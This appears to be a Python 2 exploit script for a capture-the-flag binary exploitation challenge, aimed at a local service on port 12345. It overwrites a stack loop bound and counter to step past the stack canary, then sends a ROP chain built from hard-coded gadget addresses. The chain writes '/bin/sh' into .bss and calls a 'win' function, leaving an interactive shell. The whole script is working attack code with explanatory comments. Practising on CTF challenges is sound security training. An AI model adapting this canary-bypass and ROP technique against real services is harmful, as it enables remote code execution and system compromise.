import socket
import telnetlib
import struct

s = socket.socket()
s.connect(("127.0.0.1", 12345))
f = open("log.txt", "wb")    # log file to keep the transferred payload for local testing & debugging

def recvuntil(x):
    res = s.recv(1)
    while not res.endswith(x):
        res += s.recv(1)
    return res

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

print recvuntil("?")
s.sendall("10\n")   # just send something more than 6
for i in range(5):
    print recvuntil(": ")
    s.sendall("1\n")    # junk data
print recvuntil(": ")

size = 30

# now we can overwrite the variable [rbp-0x24] that shows how many time the for loop will be executed
# we will overwrite it to 30
s.sendall(str(size * 16 ** 8) + "\n")

ptr = 0xb

# now we will overwrite the value of the counter of the loop at [rbp-0x14] to avoid overwriting the canary
# we will overwrite it in a way that we directly start writing at the stored return address
for i in range(2):
    print recvuntil(": ")
    s.sendall(str((ptr - 1) * 16 ** 8) + "\n")

# updating the log file with the stuff we've sent so far
f.write("10\n")
for i in range(5):
    f.write("1\n")
f.write(str(size * 16 ** 8) + "\n")
for i in range(2):
    f.write(str((ptr - 1) * 16 ** 8) + "\n")

# helper function to send an new number
def rop(x):
    print recvuntil(": ")
    s.sendall(str(x) + "\n")
    f.write(str(x) + "\n")

# an address in .bss that is zeroed till the time we need it
# we will write "/bin/sh" at this address
to_write = 0x006010b0

# address of the win function
win = 0x400767

# write "/bin/sh\0" into memory
rop(0x000000000040092a)   # pop rbx; pop rbp; pop 4 * junk_register; ret
rop(int("nib/".encode("hex"), 16))
rop(to_write + 0x3d)
for i in range(4):
    rop(1)
rop(0x0000000000400748)  # add dword [rbp - 0x3d], ebx ; nop; ret
to_write += 4

rop(0x000000000040092a)   # pop rbx; pop rbp; pop 4 * junk_register; ret
rop(int("\0hs/".encode("hex"), 16))
rop(to_write + 0x3d)
for i in range(4):
    rop(1)
rop(0x0000000000400748)  # add dword [rbp - 0x3d], ebx ; nop; ret

to_write -= 4

# call win and pass to_write to it as an argument
rop(0x0000000000400933) # pop rdi ; ret
rop(to_write)
rop(win)

f.close()
print "[+] payload sent"
interactive()
s.close()
